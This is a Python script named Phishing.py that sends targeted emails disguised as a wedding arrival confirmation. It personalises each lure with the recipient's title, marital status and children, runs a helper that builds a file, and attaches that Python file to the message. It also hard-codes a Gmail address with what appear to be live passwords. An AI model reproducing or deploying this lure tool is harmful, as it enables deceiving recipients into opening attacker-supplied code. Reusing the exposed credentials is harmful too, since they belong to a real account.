import sys
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.base import MIMEBase
from email import encoders
from jinja2 import Environment, FileSystemLoader
import subprocess
import requests

# run: python3 Phishing.py Username mail_service_name title job_title personal_status kids_no_kids

# run: python3 Phishing.py eventyess2023 gmail.com title job_title single yes
# run: python3 Phishing.py eventyess2023 gmail.com title job_title married yes
# run: python3 Phishing.py eventyess2023 gmail.com ms job_title married no

# python3 Phishing.py Oriekshe gmail.com ms job_title single no

if __name__ == "__main__":
    username = sys.argv[1]
    mail_server_name = sys.argv[2]
    title = sys.argv[3]
    job_title = sys.argv[4]
    personal_status = sys.argv[5]
    kids_or_no_kids = sys.argv[6]

    file = input("Please enter y if tou want to write your mail via file/string/url: ")
    # eventyess2023@gmail.com
    #    zxcvbnm,./1029
    #    wakycmkffmdbvwhj
    sender_email = "eventyess2023@gmail.com"
    receiver_email = username + "@" + mail_server_name 
    password = "wakycmkffmdbvwhj"

    message = MIMEMultipart("alternative")
    
    message["From"] = sender_email
    message["To"] = receiver_email
     # Run another Python script
    subprocess.run(['python', 'attach_create.py'])

    if(file == "y" or file == "Y"):
        data = input('enter f for file, u for url, or s for string: ')
        mail_title= input ("enter your mail title: ")
        message["Subject"] = mail_title
        if(data == "f" or data == "F"):

            file_name= input ("enter your file name: ")
            with open(file_name, "r") as file:
                email_content = file.read()
        elif(data == "u" or data == "U"):
            url = input ("enter your url: ")
            response = requests.get(url)
            if response.status_code == 200:
                email_content = response.text
            else:
                print(f"Error accessing URL. Status code: {response.status_code}")
                exit()
            email_content = response.text  
        elif(data == "s" or data == "S"):
            email_content = input ("enter your string: ")
        else:
            print("no case for that")
            exit()
        
        html_template = """
        <html>
        <body>
            <div>{content}</div>
        </body>
        </html>
        """
        html_body = html_template.format(content=email_content)
        part1 = MIMEText(html_body, "html")

    else: 
        message["Subject"] = "Arrival Confirmation - Sophie & Lidor Wedding"
        # Create the Jinja2 environment
        env = Environment(loader=FileSystemLoader('templates'))

        

        data = {
            'title': title,
            'name': username,
            'status': personal_status,
            'kids': kids_or_no_kids
        }
        
        # Render the template
        template = env.get_template('are_you_coming.html')
        output = template.render(data)
        
        part1 = MIMEText(output, "html")

        # Attach the image as an attachment
        with open("wedding2.png", "rb") as image_file:
            image = MIMEImage(image_file.read())
            image.add_header("Content-ID", "<image1>")
            message.attach(image)

    # Attach the file "attachment.py"
    filename = "attachment.py"
    with open(filename, "rb") as file:
        attachment = MIMEBase("application", "octet-stream")
        attachment.set_payload(file.read())
        encoders.encode_base64(attachment)
        attachment.add_header("Content-Disposition",
                            f"attachment; filename={filename}")
        message.attach(attachment)

    message.attach(part1)

    # Create secure connection with server and send email
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())
